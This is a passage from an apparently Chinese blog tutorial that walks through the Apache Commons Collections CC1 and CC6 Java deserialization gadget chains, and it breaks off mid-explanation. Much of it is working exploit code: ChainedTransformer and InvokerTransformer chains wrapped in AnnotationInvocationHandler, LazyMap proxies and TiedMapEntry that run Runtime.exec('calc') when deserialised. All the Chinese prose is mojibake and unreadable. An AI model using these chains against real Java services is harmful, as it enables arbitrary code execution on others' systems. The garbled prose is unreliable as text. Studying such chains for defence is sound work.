ä¸èƒ½ç›´æ¥è®¿é—® è¦é€šè¿‡åå°„è·å–\n        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);//è·å–æ„é€ å‡½æ•°\n        annotationInvocationHandlerconstructor.setAccessible(true); //å®ä¾‹åŒ–\n        Object o = annotationInvocationHandlerconstructor.newInstance(Override.class,transformedMap);//æ„é€ å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ³¨è§£ç±»å‹çš„calssï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºMapç±»å‹çš„classï¼Œä¹Ÿå°±æ˜¯readObjectä¸­éå†Mapæ—¶çš„memberValues\n\t    serialize(o);\n        unserialize(\"ser.bin\");\n\n```\n\n---\n\nä½†æ˜¯è¿™é‡Œæœ‰å‡ ä¸ªé—®é¢˜ï¼š\n\n1. \n\n```java\nmemberValue.setValue(\n                        new AnnotationTypeMismatchExceptionProxy(\n                            value.getClass() + \"[\" + value + \"]\").setMember(\n                                annotationType.members().get(name)));\n\n```\n\nè¿™é‡Œå¯¹setValueä¼ è¿›å»çš„å‚æ•°åº”è¯¥æ˜¯currentRuntimeï¼Œä½†æˆ‘ä»¬å‘ç°è¿™ä¸ªæ–¹æ³•å†…çš„å‚æ•°å€¼æˆ‘ä»¬ä¸ç¡®å®šèƒ½ä¸èƒ½æ§åˆ¶\n\n2.\n\ncurrentRuntimeæ˜¯æˆ‘ä»¬è‡ªå·±é€šè¿‡getRuntimeæ–¹æ³•å¾—åˆ°çš„ï¼Œä½†Runtimeå¯¹è±¡å¹¶æ²¡æœ‰ç»§æ‰¿Serializableï¼Œæ‰€ä»¥åœ¨ååºåˆ—åŒ–æ—¶ç›´æ¥ä¼ å…¥currentRuntimeä¼šå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥\n\n```java\n if (memberType != null) {  // i.e. member still exists\n                Object value = memberValue.getValue();\n                if (!(memberType.isInstance(value) ||\n                      value instanceof ExceptionProxy))\n                      memberValue.setValue\n\n```\n\nåœ¨æ‰§è¡ŒsetValueå‰éœ€è¦ç»•è¿‡ä¸¤ä¸ªifåˆ¤æ–­\n\n---\n\næˆ‘ä»¬å…ˆæ¥è§£å†³ç¬¬äºŒä¸ªé—®é¢˜ï¼ŒRuntimeä¸èƒ½åºåˆ—åŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨Runtime.classæ¥ä»£æ›¿å®ƒï¼Œå› ä¸ºClassç±»ä¸­ç»§æ‰¿äº†Serializableï¼Œæˆ‘ä»¬å…ˆå†™ä¸€ä¸ªåå°„å¼¹è®¡ç®—å™¨çš„paylaodç„¶åä¿®æ”¹ä¸€ä¸‹\n\n```java\nClass runtime = Runtime.class;\nMethod execMethod = runtime.getMethod(\"exec\", String.class);\nMethod getRuntime = runtime.getMethod(\"getRuntime\");\nexecMethod.invoke(getRuntime.invoke(null,null),\"calc\");\n\n```\n\né€šè¿‡InvokerTransformerè·å–getRuntimeæ–¹æ³•ï¼š\n\n```java\nMethod getRuntime = (Method) new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}).transform(Runtime.class);\n\n```\n\næˆ‘ä»¬åˆ©ç”¨InvokerTransformeræ‰§è¡Œä»»æ„ä»£ç çš„ç‰¹ç‚¹æ‰§è¡Œäº†getMethodæ–¹æ³•ï¼Œå¹¶ä¸”å‚æ•°ä¸ºgetRuntimeï¼Œæœ€ç»ˆæ‹¿åˆ°äº†getRuntimeæ–¹æ³•\n\næ¥ä¸‹æ¥æˆ‘ä»¬å†åˆ©ç”¨InvokerTransformeré€šè¿‡æ‰§è¡Œinvokeæ–¹æ³•æ¥è°ƒç”¨getRuntimeæ–¹æ³•ï¼š\n\n```java\nRuntime currentRuntime = (Runtime) new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntime);\n\n```\n\nå†é€šè¿‡åå°„å¼¹è®¡ç®—å™¨å°±å¯ä»¥äº†ï¼Œpayloadä¿®æ”¹å¦‚ä¸‹ï¼Œå¯ä»¥å‘ç°è¿™ä¸ªè°ƒç”¨é“¾ç±»ä¼¼äºä¸€ä¸ªé¦–å°¾ç›¸è¿çš„ç»“æ„ï¼Œä¸Šä¸€ä¸ªtransformerä¼ å…¥ä¸‹ä¸€ä¸ªè¿›è¡Œè°ƒç”¨ï¼š\n\n```java\nMethod getRuntime = (Method) new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}).transform(Runtime.class);\nRuntime currentRuntime = (Runtime) new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntime);\nnew InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(currentRuntime);\n\n```\n\njavaä¸­åˆšå¥½æœ‰ä¸€ä¸ªTransformerå¯ä»¥è®©ä»–ä»¬ä¸²èµ·æ¥ï¼Œå½¢æˆè¿™æ ·ä¸€ä¸ªé“¾å¼è°ƒç”¨ç»“æ„ï¼Œè¿™æ ·å°±å¯ä»¥æ›´ä¼˜é›…çš„æ‰§è¡Œpayloadï¼Œå°±æ˜¯`ChainedTransformer`ï¼Œæˆ‘ä»¬å°†ä¸Šé¢çš„ä¸‰ä¸ªtransformerä»¥æ•°ç»„æ ¼å¼ä¼ å…¥ï¼š\n\n```java\nChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{\n            new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n            new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n            new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})\n        });\n        chainedTransformer.transform(Runtime.class);\n\n```\n\nè¿™æ ·è¿™ä¸ªé—®é¢˜å°±è§£å†³äº†ï¼Œæˆ‘ä»¬æŠŠè¿™ä¸€ä¸²payloadç»“åˆåŸå…ˆçš„payloadè¿›è¡Œæ›¿æ¢ï¼š\n\n```java\n ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{\n            new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n            new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n            new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})\n        });\n\n\t   HashMap map = new HashMap();\n        map.put(\"k\",\"v\");\n\nMap<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);\n        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);\n        annotationInvocationHandlerconstructor.setAccessible(true);\n        Object o = annotationInvocationHandlerconstructor.newInstance(Override.class,transformedMap);\n        serialize(o);\n        unserialize(\"ser.bin\");\n\n```\n\næˆ‘ä»¬å‘ç°å¹¶ä¸èƒ½æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦è§£å†³æˆ‘ä»¬çš„å¦å¤–ä¸¤ä¸ªé—®é¢˜äº†ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªåˆ¤æ–­åšäº†ä»€ä¹ˆäº‹\n\n```java\n    private void readObject(java.io.ObjectInputStream s)\n        throws java.io.IOException, ClassNotFoundException {\n        s.defaultReadObject();\n\n        // Check to make sure that types have not evolved incompatibly\n\n        AnnotationType annotationType = null;\n        try {\n            annotationType = AnnotationType.getInstance(type); //typeä¸ºOverride\n        } catch(IllegalArgumentException e) {\n            // Class is no longer an annotation type; time to punch out\n            throw new java.io.InvalidObjectException(\"Non-annotation type in annotation serial stream\");\n        }\n\n        Map<String, Class<?>> memberTypes = annotationType.memberTypes(); //è·å–Overrideä¸­çš„æˆå‘˜å˜é‡\n\n        // If there are annotation members without values, that\n        // situation is handled by the invoke method.\n        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {\n            String name = memberValue.getKey();\n            Class<?> memberType = memberTypes.get(name); //å¿…é¡»ä½¿è¿”å›å€¼ä¸ä¸ºnull ä¹Ÿå°±æ˜¯memberTypesä¸­è¦æœ‰name\n            \t\t\t\t\t\t\t\t\t\t // æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®©nameä¸ºAnnotionå†…éƒ¨çš„å˜é‡å€¼\n            if (memberType != null) {  // i.e. member still exists\n                Object value = memberValue.getValue();\n                if (!(memberType.isInstance(value) ||\n                      value instanceof ExceptionProxy)) {\n                    memberValue.setValue(\n                        new AnnotationTypeMismatchExceptionProxy(\n                            value.getClass() + \"[\" + value + \"]\").setMember(\n                                annotationType.members().get(name)));\n                }\n            }\n        }\n    }\n\n```\n\né¦–å…ˆç¬¬ä¸€ä¸ªifåˆ¤æ–­memberTypeæ˜¯å¦ä¸ºç©ºï¼ŒmemberTypeæ˜¯æ„é€ å‡½æ•°ä¼ å…¥è¿›æ¥çš„Annotationçš„æˆå‘˜å˜é‡ï¼Œnameæ˜¯ä»æ„é€ å‡½æ•°ä¼ å…¥çš„mapéå†æ—¶è·å–çš„keyï¼Œä¸Šé¢ä»£ç çš„æ³¨é‡Šä¸­æåˆ°äº†å¦‚æœè¦ç»•è¿‡è¿™å±‚ifï¼Œæˆ‘ä»¬ä¼ å…¥çš„mapçš„keyä¸­å°±å¿…é¡»è¦æœ‰ä¼ å…¥çš„Annotationçš„å˜é‡å€¼ï¼Œä½†Overrideå†…éƒ¨æ²¡æœ‰å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨Targetï¼Œå¹¶ä¸”å°†å…¶ä¸­çš„valueå±æ€§å­˜å…¥åˆ°mapä¸­å»\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211242007067.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211242007067.png)\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211242012006.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202211242012006.png)\n\n```java\nmap.put(\"value\",\"v\");\nObject o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);\n\n```\n\næˆ‘ä»¬å†çœ‹ç¬¬äºŒå±‚ifï¼ŒmemberTypeæ˜¯ä¸€ä¸ªAnnotationï¼Œè€Œvalueæ˜¯ä¸€ä¸ªVï¼ˆé”®å€¼å¯¹ä¸­çš„Valueç±»ï¼‰ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥è¿”å›falseï¼Œé€šè¿‡ç¬¬äºŒå±‚ifï¼š\n\n```java\nObject value = memberValue.getValue();\nif (!(memberType.isInstance(value) ||\n                      value instanceof ExceptionProxy )) {\n                    memberValue.setValue(\n                        new AnnotationTypeMismatchExceptionProxy(\n                            value.getClass() + \"[\" + value + \"]\").setMember(\n                                annotationType.members().get(name)));\n                }\n\n```\n\nå‰©ä¸‹çš„æœ€åä¸€ä¸ªé—®é¢˜ï¼Œç°åœ¨setValueä¸­ä¼ å…¥çš„ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œè¿™æ—¶æˆ‘ä»¬éœ€è¦å¦å¤–ä¸€ä¸ªTransformerï¼Œ`ConstantTransformer`ï¼Œ\n\nå®ƒçš„transformæ–¹æ³•ä¸è®ºæ¥æ”¶ä»€ä¹ˆå¯¹è±¡ï¼Œéƒ½å¯ä»¥åŸå°ä¸åŠ¨çš„è¾“å‡ºä¸€ä¸ªæˆ‘ä»¬å¯æ§çš„å€¼ï¼š\n\n```java\n    public ConstantTransformer(Object constantToReturn) {\n        super();\n        iConstant = constantToReturn;\n    }\n    public Object transform(Object input) {\n        return iConstant;\n    }\n\n```\n\næ‰€ä»¥æœ€ç»ˆpayloadä¿®æ”¹ä¸ºï¼š\n\n```java\npublic class CC1Test {\n    public static void main(String[] args) throws Exception {\n\n        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{\n            new ConstantTransformer(Runtime.class),\n            new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}),\n            new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),\n            new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"})\n        });\n//        chainedTransformer.transform(Runtime.class);\n//        InvokerTransformer invokerTransformer =  new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"});\n        HashMap map = new HashMap();\n        map.put(\"value\",\"v\");\n        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);\n        Class annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\n        Constructor annotationInvocationHandlerconstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class,Map.class);\n        annotationInvocationHandlerconstructor.setAccessible(true);\n        Object o = annotationInvocationHandlerconstructor.newInstance(Target.class,transformedMap);\n        serialize(o);\n        unserialize(\"ser.bin\");\n\n//        Method getRuntime = (Method) new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}).transform(Runtime.class);\n//        Runtime currentRuntime = (Runtime) new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntime);\n//        new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"calc\"}).transform(currentRuntime);\n\n    }\n    public static void serialize(Object obj) throws IOException\n    {\n        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\"));\n        oos.writeObject(obj);\n    }\n    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException\n    {\n        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));\n        Object obj = ois.readObject();\n        return obj;\n\n    }\n}\n\n```\n\næˆ‘ä»¬æŠŠé“¾å­å€’ç€æ¨äº†ä¸€éï¼Œåœ¨è¿›è¡Œååºåˆ—åŒ–çš„æ—¶å€™æ˜¯ä»æˆ‘ä»¬ç¼–å†™payloadçš„æœ€åå¼€å§‹è§¦å‘çš„ï¼Œä¹Ÿå°±æ˜¯`AnnotationInvocationHandler`çš„readObjectæ–¹æ³•ï¼Œå¦‚æœè¿˜æœ‰ä¸æ‡‚çš„åœ°æ–¹å¯ä»¥ä¸‹æ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ã€‚\n\n# ç¬¬äºŒæ¡é“¾å­ï¼š\n\næˆ‘ä»¬åœ¨ç¬¬ä¸€æ¡é“¾å­ä¸­æ‰¾InvokerTransformer.transformçš„ä¸‹ä¸€è°ƒç”¨æ—¶å½“æ—¶æ‰¾åˆ°äº†ä¸¤ä¸ªMapï¼Œä½†åæ¥æˆ‘ä»¬å°†ä¸‰ä¸ªInvokerTransfomerå°è£…è¿›äº†ä¸€ä¸ªChainedTransformerä¸­ï¼Œæ‰€ä»¥å…¶å®åœ¨ChainedTransformerçš„trnasformä¸­è°ƒç”¨çš„è¿˜æ˜¯InvokerTransformerçš„transformæ–¹æ³•ï¼Œå› æ­¤æ‰¾InvokerTransformer.transformå’Œæ‰¾ChainedTransformer.transformçš„åç»­ç”¨æ³•æ˜¯ä¸€æ ·çš„,ç¬¬ä¸€æ¡é“¾ä¸­åˆ©ç”¨çš„æ˜¯TransformedMapï¼Œè¿˜æœ‰å¦å¤–ä¸€ä¸ªLazyMapï¼Œå…¶ä¸­çš„getæ–¹æ³•è°ƒç”¨äº†transformï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œè·Ÿä¸‹å»ï¼š\n\n```java\npublic ChainedTransformer(Transformer[] transformers) {\n    super();\n    iTransformers = transformers;\n}\n\npublic Object transform(Object object) {\n        for (int i = 0; i < iTransformers.length; i++) {\n            object = iTransformers[i].transform(object);\n        }\n        return object;\n    }\n```\n\n![image-20230206143114129](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143114129.png)\n\nçœ‹ä¸€ä¸‹LazyMapï¼Œgetæ–¹æ³•ä¸­å­˜åœ¨factory.transformï¼Œfactoryæ„é€ å‡½æ•°å¯æ§ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åšçš„å°±æ˜¯å°†factoryä¼ å€¼ä¸ºChainedTransformerï¼Œå¹¶ä¸”è¿›å…¥ifåˆ¤æ–­ï¼Œmapä¸­æ²¡æœ‰keyæ‰ä¼šè§¦å‘transform:\n\n```java\nprotected LazyMap(Map map, Transformer factory) {\n    super(map);\n    if (factory == null) {\n        throw new IllegalArgumentException(\"Factory must not be null\");\n    }\n    this.factory = factory;\n}\n\npublic Object get(Object key) {\n        // create value for key if key is not currently in the map\n        if (map.containsKey(key) == false) {\n            Object value = factory.transform(key);\n            map.put(key, value);\n            return value;\n        }\n        return map.get(key);\n    }\n```\n\næˆ‘ä»¬æ¥ç€æ‰¾è°è°ƒç”¨äº†getï¼Œfindusagesç»“æœå…­åƒå¤šæ¡æˆ‘å°±ä¸æ‰¾äº†ï¼Œæœ€ç»ˆæ˜¯é”å®šåœ¨äº†`AnnotationInvocationHandler.invoke`ä¸Šï¼ŒmemberValuesæ˜¯æ„é€ å‡½æ•°ä¼ å…¥çš„ä¸€ä¸ªMapï¼š\n\n```java\nObject result = memberValues.get(membjieker);\n```\n\n```java\nAnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues)\n```\n\nç”±äº`AnnotationInvocationHandler`æ˜¯ä¸€ä¸ª[åŠ¨æ€ä»£ç†è°ƒç”¨å¤„ç†å™¨ç±»](https://blog.csdn.net/Justin_bibo/article/details/114888702)ï¼Œå½“åœ¨åŠ¨æ€ä»£ç†ä¸­è°ƒç”¨`AnnotationInvocationHandler`çš„æ–¹æ³•æ—¶å°±ä¼šè‡ªåŠ¨è°ƒç”¨invokeï¼Œè¿™é‡Œç»™å‡ºçš„æ˜¯`AnnotationInvocationHandler.readObject`ï¼Œå¯ä»¥è¯´æ˜¯å¾ˆå·§äº†ï¼Œé€šè¿‡è‡ªå·±è°ƒç”¨è‡ªå·±ï¼Œå…¶å®ç”¨å…¶ä»–çš„ç±»ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä¹Ÿç®—æ˜¯ä¸€ä¸ªæ¯”è¾ƒæœ‰è¶£çš„ç‚¹ï¼Œæˆ‘ä»¬æ¥çœ‹è°ƒç”¨è¿‡ç¨‹ï¼š\n\n![image-20230206143014958](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143014958.png)\n\nå…ˆçœ‹invokeï¼š\n\n```java\nif (member.equals(\"equals\") && paramTypes.length == 1 &&\n    paramTypes[0] == Object.class)\n    return equalsImpl(args[0]);\nif (paramTypes.length != 0)\n    throw new AssertionError(\"Too many parameters for an annotation method\");\n\n Object result = memberValues.get(member);\n```\n\næƒ³è¦æ‰§è¡Œgetæ–¹æ³•æˆ‘ä»¬è¦ä¿è¯å‰é¢çš„ä¸¤ä¸ªifä¸èƒ½æ‰§è¡Œï¼Œé¦–å…ˆæ–¹æ³•åä¸èƒ½ä¸ºequalsï¼Œå¹¶ä¸”è¦æ˜¯ä¸€ä¸ªæ— å‚æ–¹æ³•ï¼Œåœ¨readObjectä¸­æ°å¥½è°ƒç”¨äº†memberValuesçš„entrySetæ–¹æ³•ï¼š\n\n```java\nfor (Map.Entry<String, Object> memberValue : memberValues.entrySet())\n```\n\næˆ‘ä»¬æ­£å‘æ¢³ç†ä¸€ä¸‹æµç¨‹ï¼š\n\n- å…±éœ€è¦ä¸¤ä¸ªAnnotationInvocationHandlerï¼Œç¬¬ä¸€ä¸ªAIHä¸­memberValuesä¸ºProxyï¼ˆä»£ç†äº†ç¬¬äºŒä¸ªAnnotationInvocationHandlerçš„åŠ¨æ€ä»£ç†ï¼‰ï¼Œè¿™æ ·é€šè¿‡è°ƒç”¨Proxy.entrySetæ¥è§¦å‘Proxyçš„invokeï¼ŒProxyä¸­AIHçš„memberValuesä¸ºLazyMapï¼Œåœ¨Proxyçš„invokeä¸­è°ƒç”¨äº†LazyMap.getï¼Œè§¦å‘ChainedTransformer.transformï¼Œå‰©ä¸‹çš„è§¦å‘ç‚¹å°±å’Œä¹‹å‰çš„ç¬¬ä¸€æ¡é“¾ä¸€æ ·äº†ã€‚\n\n**å¼€å§‹æ“payloadï¼š**\n\nç”±äºå‰é¢çš„Transformeréƒ¨åˆ†éƒ½ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥æŠŠåœ¨CC1ä¸­ç”ŸæˆChainedTrnasformerå°è£…åˆ°äº†ä¸€ä¸ªç±»çš„é™æ€æ–¹æ³•ä¸­ï¼Œè¿™æ ·åœ¨ä¹‹åçš„é“¾å­ä¸­å¦‚æœç”¨åˆ°äº†ChainedTransformerç›´æ¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•å³å¯ï¼š\n\n![image-20230206143045565](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143045565.png)\n\nLazyMapæœ‰ä¸¤ä¸ªdecorateæ–¹æ³•å’Œä¸¤ä¸ªæ„é€ å‡½æ•°ï¼Œæˆ‘ä»¬è¦ç”¨çš„æ˜¯æ¥æ”¶mapå’ŒTransformerçš„decorateå’Œæ„é€ å‡½æ•°ï¼š\n\n```java\npublic static Map decorate(Map map, Transformer factory) {\n    return new LazyMap(map, factory);\n}\n\nprotected LazyMap(Map map, Transformer factory) {\n        super(map);\n        if (factory == null) {\n            throw new IllegalArgumentException(\"Factory must not be null\");\n        }\n        this.factory = factory;\n    }\n```\n\npaylaodï¼š\n\n```java\nChainedTransformer ctf = getChain.getChainedTransformer();\nHashMap<Object,Object> map = new HashMap<>();\nMap<Object,Object> lazymap = LazyMap.decorate(map,ctf);\n```\n\nåŠ¨æ€ä»£ç†ï¼š\n\n```java\nChainedTransformer ctf = getChain.getChainedTransformer();\nHashMap<Object,Object> map = new HashMap<>();\nMap<Object,Object> lazymap = LazyMap.decorate(map,ctf);\n\nClass AIH = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\");\nConstructor AIHC = AIH.getDeclaredConstructor(Class.class,Map.class);\nAIHC.setAccessible(true);\nInvocationHandler AIHCIH = (InvocationHandler) AIHC.newInstance(Override.class,lazymap);\n\nMap mapProxy = (Map) Proxy.newProxyInstance(lazymap.getClass().getClassLoader(),new Class[]{Map.class},AIHCIH);\nObject o = AIHC.newInstance(Override.class,mapProxy);\nserialize(o);\nunserialize(\"ser.bin\");\n```\n\næˆ‘ä»¬åœ¨å®ä¾‹åŒ–InvocationHandleræ—¶ä¼ å…¥çš„ç¬¬ä¸€ä¸ªæ³¨è§£å‚æ•°ä¸éœ€è¦å†æ˜¯`Target`ï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»ä¸å†éœ€è¦readObjectä¸­çš„`setValue`ï¼Œè€Œæ˜¯ç›´æ¥åœ¨éå†mapæ—¶åˆ©ç”¨`memberValues.entrySet()`ã€‚\n\nCC1çš„ä¸¤æ¡åˆ©ç”¨é“¾:\n\n![image-20230206143129393](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143129393.png)\n\n# CommonsCollections6\n\nåœ¨jdk8u71ä¸­å¯¹CommonsCollections1åšå‡ºäº†ä¿®å¤ï¼Œä¸»è¦æ˜¯åœ¨`AnnotationInvocationHandler.readObject`ä¸­åšå‡ºäº†ä¿®æ”¹ï¼Œé’ˆå¯¹`checkSetValue`é“¾ä¸­ï¼ŒreadObjectä¸­æ•´ä¸ªç§»é™¤äº†å¯¹`checkSetValue`çš„æ“ä½œï¼Œé’ˆå¯¹`LazyMap`é“¾åˆ™å°†`memberValues`è®¾ç½®ä¸ºäº†å®¢æˆ·ç«¯ä¸å¯æ§ï¼Œè€Œæ˜¯é€šè¿‡ä¸€ä¸ªFiledç±»æ¥è¿›è¡Œè¯»å–ã€‚æˆ‘ä»¬åœ¨å®é™…è¿›è¡Œååºåˆ—åŒ–çš„æ”»å‡»æ—¶ï¼Œå¦‚æœä½¿ç”¨CC1æ¥æ”»å‡»æ—¶ï¼Œä¸€æ—¦jdkç‰ˆæœ¬æ›´æ”¹åŸæœ‰çš„gadgetchainå°±æ— æ³•ä½¿ç”¨ï¼Œè¿™æ ·å¯¹æˆ‘ä»¬çš„æ”»å‡»è¿›è¡Œäº†æå¤§çš„å—é™ï¼Œé‚£ä¹ˆæœ‰æ²¡æœ‰ä¸€ä¸ªå—jdkç‰ˆæœ¬å½±å“å¯¹çš„gadgetchainå‘¢ï¼Œæˆ‘ä»¬æ¥çœ‹CC6ã€‚\n\nysoserialä¸­ç»™å‡ºçš„gadgetchainï¼Œå¯ä»¥çœ‹åˆ°é“¾å­ååŠæˆªç›´åˆ°`LazyMap.get()`å’Œæˆ‘ä»¬CC1çš„LazyMapé“¾æ˜¯ä¸€æ ·çš„ï¼š \n\n![image-20230206143314008](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143314008.png)\n\nå†å¾€ä¸Šçœ‹æˆ‘ä»¬å‘ç°è§¦å‘ç‚¹æ˜¯`HashMap.hash`ï¼Œè¿™é‡Œå’Œ[URLDNS](https://www.notion.so/URLDNS-8a6e81f093e146879b842c75ce902273)ä¸­éå¸¸åƒäº†ï¼Œé€šè¿‡å‘`HashMap`putä¸€ä¸ªé”®å€¼å¯¹ï¼Œé‚£ä¹ˆåœ¨HashMapçš„readobjectä¸­å°±ä¼šå¯¹Mapçš„é”®å€¼å¯¹è¿›è¡Œéå†ï¼Œå¹¶ä¸”å¯¹æ¯ä¸€ä¸ªé”®å€¼å¯¹çš„keyè¿›è¡Œhashï¼Œåœ¨è¿›è¡Œhashæ—¶ä¼šå¯¹keyè¿›è¡ŒhashCodeã€‚\n\n![image-20230206143245908](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143245908.png)\n\næ ¹æ®ä¸Šé¢ysoserialç»™å‡ºçš„gadgetchainï¼Œæˆ‘ä»¬å‘ç°æ‰€éœ€è¦è°ƒç”¨çš„hashCodeçš„ç±»å°±æ˜¯`TiedMapEntry`ï¼Œgadgetchainè¡¥å……å®Œä¹‹åå°±æ˜¯è¿™æ ·äº†ï¼š\n\n![image-20230206143301864](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/image-20230206143301864.png)\n\næˆ‘ä»¬æ¥çœ‹è¿™ä¸ªTiedMapEntryï¼Œå®ƒçš„æ„é€ å‡½æ•°æ¥æ”¶ä¸€ä¸ªMapå’Œä¸€ä¸ªkeyï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªç±»å‚¨å­˜çš„é”®å€¼å¯¹æ ¼å¼æ˜¯ Map-keyï¼Œï¼ˆæ³¨æ„è¿™é‡Œkeyåªæ˜¯ä¸€ä¸ªåå­—ï¼Œæˆ‘ä»¬é€šå¸¸è¯´çš„key-valueä¸€èˆ¬æ¥è¯´æ˜¯keyåœ¨å‰ï¼Œvalueåœ¨åï¼Œä½†keyæ˜¯å¦åœ¨å‰æ˜¯ä¸ä¸€å®šçš„ï¼ŒHashMapä¸­ä»¥Key-valueæ ¼å¼å‚¨å­˜é”®å€¼å¯¹ï¼Œé‚£ä¹ˆå¯¹äºHashMapæ¥è¯´åœ¨å‰é¢çš„å°±æ˜¯keyï¼Œè€ŒTiedMapEntryä»¥Map-keyå½¢å¼å‚¨å­˜é”®å€¼å¯¹ï¼Œé‚£ä¹ˆå¯¹å®ƒæ¥è¯´keyå°±åœ¨åé¢ï¼‰æˆ‘ä»¬å°†lazymapæ‰”åˆ°TiedMapEntryä¸­ï¼š\n\n```java\nChainedTransformer ctf = getChain.getChainedTransformer();\nHashMap<Object,Object> map = new HashMap<>();\nMap<Object,Object> lazyMap = LazyMap.decorate(map,ctf);\n\nTiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"123\");\n```\n\nå†å°†`tiedMapEntry`ä½œä¸ºé”®å€¼å‚¨å­˜åˆ°HashMapä¸­ï¼š\n\n```java\nChainedTransformer ctf = getChain.getChainedTransformer();\nHashMap<Object,Object> map = new HashMap<>();\nMap<Object,Object> lazyMap = LazyMap.decorate(map,ctf);\n\nTiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,\"123\");\nHashMap<Object,Object> hashMap = new HashMap<>();\nhashMap.put(tiedMapEntry,\"123\");\nserialize(hashMap);\n```\n\nä½†æ˜¯è¿™é‡Œä¾ç„¶æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœè¿è¡Œä¸€ä¸‹ä¸Šé¢çš„ä»£ç ä¼šå‘ç°æˆ‘æ²¡æœ‰è¿›è¡Œååºåˆ—åŒ–ä¹Ÿå¼¹å‡ºäº†è®¡ç®—å™¨ï¼Œè¿™ä¸ªé—®é¢˜æˆ‘ä»¬åœ¨URLDNSä¸­å°±é‡åˆ°è¿‡ï¼Œå½“åºåˆ—åŒ–æ—¶ï¼Œåœ¨æˆ‘ä»¬put`tiedMapEntry`æ—¶å°±å·²ç»è§¦å‘äº†hashCodeï¼Œè®¡ç®—å™¨å°±ä¼šå¼¹å‡ºï¼Œå¹¶ä¸æ˜¯é€šè¿‡ååºåˆ—åŒ–æ¥è§¦å‘çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åŠ ä¸€æ®µä»£ç 